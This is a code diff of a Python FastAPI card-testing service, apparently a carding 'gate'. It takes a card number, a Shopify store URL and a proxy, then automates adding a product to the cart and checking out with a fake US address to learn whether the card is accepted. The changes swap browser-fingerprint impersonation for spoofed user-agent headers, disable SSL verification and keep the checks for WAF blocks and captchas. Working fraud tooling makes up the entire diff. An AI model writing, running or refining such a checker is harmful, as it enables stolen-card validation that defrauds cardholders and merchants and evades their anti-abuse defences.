@@ -1,13 +1,16 @@
 from fastapi import FastAPI, Query
 from fastapi.responses import JSONResponse
-from curl_cffi import requests
+import requests
 import re
 import uuid
 import random
 import time
-import json
+import urllib3
 from html import unescape
 from urllib.parse import urlparse
+
+# إخفاء تحذيرات SSL
+urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
 app = FastAPI()
 
@@ -20,8 +23,7 @@ def format_proxy(proxy_str):
     return f"http://{proxy_str}"
 
 def safe_response(msg, raw_data, price, gate="Python X-Ray"):
-    # دمج الرد الحقيقي مع الرسالة عشان البوت بتاعك يطبعها وتشوفها بعينك
-    raw_clean = str(raw_data).replace('\n', ' ').replace('\r', '')[:60] if raw_data else "No Raw Data"
+    raw_clean = str(raw_data).replace('\n', ' ').replace('\r', '').replace('  ', '')[:70] if raw_data else "No Raw Data"
     final_msg = f"{msg} | RAW: {raw_clean}"
     clean_price = str(price).replace('$', '').strip() if price else "-"
     return {"Response": final_msg, "Price": clean_price, "Gate": gate}
@@ -46,9 +48,17 @@ def api_endpoint(cc: str = Query(...), url: str = Query(...), proxy: str = Query
             "address1": "4024 College Point Blvd", "city": "Flushing", "province": "NY", "zip": "11354", "country": "US", "phone": "2125551234"
         }
 
-        # استخدام متصفح كروم 120 لتخطي البصمة
-        with requests.Session(impersonate="chrome120", proxies=proxies) as session:
+        # استخدام Session عادية جداً عشان السيرفر ميهنجش
+        with requests.Session() as session:
+            session.verify = False
+            if proxies: session.proxies.update(proxies)
             
+            session.headers.update({
+                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36',
+                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
+                'Accept-Language': 'en-US,en;q=0.9'
+            })
+
             # 1. سحب المنتج
             variant_id, price = None, "-"
             ep = f"{store_url}/products.json?limit=250"
@@ -67,9 +77,9 @@ def api_endpoint(cc: str = Query(...), url: str = Query(...), proxy: str = Query
                                     break
                         if variant_id: break
                 else:
-                    return JSONResponse(content=safe_response("Blocked at Product Fetch", f"HTTP {r1.status_code} - {r1.text[:50]}", "-"))
+                    return JSONResponse(content=safe_response("Blocked at Product Fetch", f"HTTP {r1.status_code}", "-"))
             except Exception as e:
-                return JSONResponse(content=safe_response("Proxy Connection Failed", str(e), "-"))
+                return JSONResponse(content=safe_response("API Proxy Error", str(e), "-"))
 
             if not variant_id: 
                 return JSONResponse(content=safe_response("Product Not Found", "No variants available", "-"))
@@ -78,16 +88,13 @@ def api_endpoint(cc: str = Query(...), url: str = Query(...), proxy: str = Query
             session.headers.update({"X-Requested-With": "XMLHttpRequest", "Accept": "application/json"})
             add_res = session.post(f"{store_url}/cart/add.js", json={"id": variant_id, "quantity": 1})
             if add_res.status_code not in [200, 201]: 
-                return JSONResponse(content=safe_response("Cart Add Blocked", f"HTTP {add_res.status_code} - {add_res.text[:50]}", price))
+                return JSONResponse(content=safe_response("Cart Add Blocked", f"HTTP {add_res.status_code}", price))
 
             time.sleep(1)
 
-            # 3. فتح صفحة الدفع وتوليد التوكن
+            # 3. فتح صفحة الدفع
             session.headers.pop("X-Requested-With", None)
-            session.headers.update({
-                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
-                'Content-Type': 'application/x-www-form-urlencoded'
-            })
+            session.headers.update({'Content-Type': 'application/x-www-form-urlencoded'})
             
             res_chk = session.post(f"{store_url}/cart", data={"checkout": "Checkout"}, allow_redirects=True)
             html_chk = res_chk.text
@@ -95,7 +102,6 @@ def api_endpoint(cc: str = Query(...), url: str = Query(...), proxy: str = Query
 
             # كشف الحظر الحقيقي
             if res_chk.status_code in [403, 429]:
-                # هيجيبلك أول 50 حرف من الصفحة عشان تعرف ده حظر Cloudflare ولا حاجة تانية
                 return JSONResponse(content=safe_response("WAF Blocked Checkout", html_chk[:80], price))
             
             if 'hcaptcha' in html_chk.lower() or 'g-recaptcha' in html_chk.lower() or 'challenge-platform' in html_chk.lower():
@@ -122,7 +128,7 @@ def api_endpoint(cc: str = Query(...), url: str = Query(...), proxy: str = Query
             if not is_graphql:
                 title = re.search(r'<title>(.*?)</title>', html_chk, re.IGNORECASE)
                 t_str = title.group(1).strip() if title else "No Title"
-                return JSONResponse(content=safe_response("Token Not Found", f"Page Title: {t_str}", price))
+                return JSONResponse(content=safe_response("Token Not Found", f"Page: {t_str}", price))
 
             if not checkout_token: checkout_token = "unknown"
 
@@ -167,7 +173,7 @@ def api_endpoint(cc: str = Query(...), url: str = Query(...), proxy: str = Query
             if sub_data.get('__typename') == 'SubmitRejected':
                 errs = sub_data.get('errors', [])
                 msg = errs[0].get('localizedMessage', 'Rejected') if errs else 'Rejected'
-                return JSONResponse(content=safe_response("Shopify Declined", f"Error: {msg}", price))
+                return JSONResponse(content=safe_response("Shopify Declined", msg, price))
             
             receipt_id = sub_data.get('receipt', {}).get('id')
             if not receipt_id: 
@@ -193,4 +199,4 @@ def api_endpoint(cc: str = Query(...), url: str = Query(...), proxy: str = Query
             return JSONResponse(content=safe_response("Bank Timeout", "Waited 9 secs for bank", price))
 
     except Exception as e:
-        return JSONResponse(content=safe_response("System Error", str(e), "-"))
+        return JSONResponse(content=safe_response("API Logic Error", str(e), "-"))
